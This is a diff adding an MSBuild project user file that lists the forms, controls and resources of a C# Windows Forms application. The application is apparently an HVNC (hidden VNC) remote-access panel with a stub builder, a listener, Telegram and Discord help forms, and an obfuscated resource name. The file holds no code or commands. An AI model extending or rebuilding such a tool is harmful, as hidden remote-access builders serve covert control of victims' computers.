@@ -1,0 +1,86 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="Current" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <PropertyGroup />
+  <ItemGroup>
+    <Compile Update="AeroListView.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Update="FlatNumericUpDown.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Update="HVNC\Controls\RJCircularPictureBox.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Update="HVNC\Controls\RJDropdownMenu.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Update="HVNC\Controls\RJToggleButton.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Update="HVNC\Help.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="HVNC\HelpDisc.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="HVNC\HelpTel.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="HVNC\hVNC.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="HVNC\Listener.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="HVNC\Login.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="HVNC\Manager.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="HVNC\MoveBytes.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="HVNC\StubBuilder.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="HVNC\TGtoDSC.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Update="JCS\ToggleSwitch.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Update="PrimeButton.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Update="PrimeTheme.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Update="RJCodeAdvance.RJControls\RJComboBox.cs">
+      <SubType>UserControl</SubType>
+    </Compile>
+    <Compile Update="StudioButton.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Update="StudioTheme.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Update="ThemeContainer152.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Update="ThemeControl152.cs">
+      <SubType>Component</SubType>
+    </Compile>
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Update="aR3nbf8dQp2feLmk31.lSfgApatkdxsVcGcrktoFd.resx">
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+    <EmbeddedResource Update="HVNC\Help.resx">
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+    <EmbeddedResource Update="HVNC\Properties\Resources.resx">
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+  </ItemGroup>
+</Project>
